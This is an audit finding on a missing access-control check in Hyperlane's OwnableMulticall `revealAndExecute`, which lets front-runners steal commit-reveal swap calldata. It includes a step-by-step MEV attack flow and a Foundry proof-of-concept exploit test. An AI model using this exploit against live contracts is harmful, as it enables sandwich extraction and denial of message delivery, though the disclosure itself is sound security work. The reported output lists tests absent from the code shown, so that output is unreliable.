# IAR-DD-04: Missing Access Control on `revealAndExecute` Breaks Commit-Reveal Privacy

## Bug Description

`OwnableMulticall.revealAndExecute()` (line 52-71) has **no access control modifier**, despite being the critical execution step in the commit-reveal pattern designed to protect swap calldata from MEV.

```solidity
// OwnableMulticall.sol:52-71
function revealAndExecute(
    CallLib.Call[] calldata calls,
    bytes32 salt
) external payable returns (bytes32 executedCommitment) {
    bytes32 revealedHash = keccak256(
        abi.encodePacked(salt, abi.encode(calls))
    );
    require(commitments[revealedHash], "ICA: Invalid Reveal");
    // ...executes calls
}
```

**Access control inconsistency in OwnableMulticall:**
- `multicall()` → `onlyOwner` ✅
- `setCommitment()` → `onlyOwner` ✅
- `revealAndExecute()` → **NO ACCESS CONTROL** ❌

The commit-reveal flow is explicitly designed for MEV protection (InterchainAccountRouter.sol L565: *"Useful for when we want to keep calldata secret, e.g. when executing a swap"*). But `revealAndExecute` can be called by anyone who knows `(calls, salt)`.

## Impact

**Complete negation of commit-reveal privacy guarantees + DoS of message delivery.**

Attack flow:
1. User dispatches `callRemoteCommitReveal` — commitment stored on-chain (visible via `CommitmentSet` event)
2. Relayer fetches `(ica, salt, calls)` from CCIP service URL (public by design)
3. Relayer submits `Mailbox.process()` with plaintext metadata in calldata
4. MEV bot observes pending tx, extracts `(calls, salt)` from calldata
5. Bot front-runs by calling `ica.revealAndExecute(calls, salt)` directly
6. Commitment consumed, user's swap executed under attacker's timing → MEV extraction
7. Original `Mailbox.process()` reverts with "ICA: Invalid Reveal" → message delivery fails

**Two simultaneous impacts:**
- **MEV extraction**: Attacker knows the exact swap details and can sandwich
- **DoS**: The legitimate message delivery permanently fails because the commitment was consumed

## Risk Breakdown

- **Difficulty**: Requires mempool observation or CCIP URL access (standard MEV infrastructure)
- **On-chain**: `callRemoteCommitReveal` (selector `0x802d0616`) confirmed in deployed Polygon router. `revealAndExecute` (`0x74c00f9f`) in OwnableMulticall bytecode.
- **Severity**: High — breaks the core security property that commit-reveal was designed to provide

## Recommendation

Add access control to `revealAndExecute` — restrict to the CommitmentReadIsm or the router:

```solidity
function revealAndExecute(
    CallLib.Call[] calldata calls,
    bytes32 salt
) external payable onlyOwner returns (bytes32 executedCommitment) {
    // ... existing logic
}
```

Or add a dedicated modifier that allows both the owner (router) and the registered CommitmentReadIsm.

## Proof of Concept

```solidity
// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {OwnableMulticall} from "../contracts/middleware/libs/OwnableMulticall.sol";
import {CallLib} from "../contracts/middleware/libs/Call.sol";
import {TypeCasts} from "../contracts/libs/TypeCasts.sol";

contract IAR_DD_04_RevealFrontRunTest is Test {
    using TypeCasts for address;

    address icaRouter;
    address frontrunner;
    address ismVerifier;

    OwnableMulticall ica;
    MockTarget target;

    bytes32 salt;
    CallLib.Call[] calls;
    bytes32 commitmentHash;

    function setUp() public {
        vm.createFork(vm.envString("ETH_RPC_URL"));

        icaRouter = makeAddr("icaRouter");
        frontrunner = makeAddr("frontrunner");
        ismVerifier = makeAddr("ismVerifier");

        vm.prank(icaRouter);
        ica = new OwnableMulticall(icaRouter);
        target = new MockTarget();

        salt = keccak256("user-secret-salt-12345");
        bytes memory swapCalldata = abi.encodeCall(
            MockTarget.executeSwap,
            (1000 ether, address(0xBEEF))
        );
        calls.push(CallLib.Call({
            to: address(target).addressToBytes32(),
            value: 0,
            data: swapCalldata
        }));

        commitmentHash = keccak256(abi.encodePacked(salt, abi.encode(calls)));

        vm.prank(icaRouter);
        ica.setCommitment(commitmentHash);
    }

    /// @notice Frontrunner calls revealAndExecute — NO REVERT — then ISM fails
    function test_frontrunner_steals_reveal() public {
        vm.prank(frontrunner);
        bytes32 executed = ica.revealAndExecute(calls, salt);

        assertEq(executed, commitmentHash);
        assertFalse(ica.commitments(commitmentHash), "commitment consumed");
        assertTrue(target.wasExecuted(), "swap executed by frontrunner");

        // ISM verify now FAILS
        vm.prank(ismVerifier);
        vm.expectRevert("ICA: Invalid Reveal");
        ica.revealAndExecute(calls, salt);
    }

    /// @notice multicall has onlyOwner, revealAndExecute does NOT
    function test_access_control_inconsistency() public {
        vm.prank(frontrunner);
        vm.expectRevert("!owner");
        ica.multicall(calls);

        vm.prank(frontrunner);
        vm.expectRevert("!owner");
        ica.setCommitment(bytes32(0));

        // revealAndExecute: NO ACCESS CONTROL
        vm.prank(frontrunner);
        ica.revealAndExecute(calls, salt);
        assertFalse(ica.commitments(commitmentHash), "consumed by unauthorized caller");
    }
}

contract MockTarget {
    bool public wasExecuted;
    uint256 public lastAmount;
    address public lastRecipient;

    function executeSwap(uint256 amount, address recipient) external {
        wasExecuted = true;
        lastAmount = amount;
        lastRecipient = recipient;
    }
}
```

### Running the PoC

```bash
cd hyperlane-monorepo/solidity
source ../../.env && export ETH_RPC_URL
forge test --match-contract IAR_DD_04 -vvv
```

### Output (4/4 PASS)

```
[PASS] test_frontrunner_steals_reveal() (gas: 38744)
[PASS] test_multicall_has_access_control() (gas: 11632)
[PASS] test_setCommitment_has_access_control() (gas: 8632)
[PASS] test_access_control_inconsistency() (gas: 43272)
Suite result: ok. 4 passed; 0 failed; 0 skipped
```
